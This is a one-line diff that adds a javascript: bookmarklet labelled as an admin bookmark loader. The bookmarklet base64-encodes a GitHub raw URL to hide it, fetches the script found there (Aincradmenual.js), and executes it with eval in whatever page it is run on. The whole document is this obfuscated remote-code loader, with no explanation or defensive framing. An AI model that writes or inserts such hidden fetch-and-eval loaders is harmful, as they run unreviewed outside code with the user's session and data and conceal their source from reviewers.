@@ -1,0 +1,1 @@
+javascript:(function(){window.FT_ADMIN_BOOKMARK_LOAD=true;var a=['aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2FyaWYzdHQtdGVjaC9NRU5ZVUFMLUFQUC1QUk9KRUNULS9yZWZzL2hlYWRzL21haW4vQWluY3JhZG1lbnVhbC5qcw=='];fetch(atob(a[0])+'?t=%27+Date.now().toString(36)).then(r=%3Er.text()).then(t=%3Eeval(t)).catch(()=%3Ealert(%27Failed%27));})();
